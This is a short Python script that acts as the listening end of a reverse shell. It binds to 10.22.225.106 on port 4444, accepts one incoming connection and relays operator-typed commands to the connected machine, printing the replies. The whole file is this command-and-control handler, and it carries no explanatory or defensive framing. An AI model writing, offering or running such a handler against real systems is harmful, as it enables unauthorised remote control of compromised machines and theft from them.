import socket
import sys

sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

LHOST = "10.22.225.106"
LPORT = 4444

sk.bind((LHOST, LPORT))

sk.listen(5)
print(f"Listening on Port {LPORT}...")

(client_socket, client_address) = sk.accept()
print(f"Connection established with {client_address}")

while True:
    command = input("> ")
    if command == "exit":   
        sk.close()
        sys.exit(1)
        break
    request = client_socket.send(command.encode("utf-8"))
    response =  client_socket.recv(1024).decode()
    print(response)

client_socket.close()
sk.close()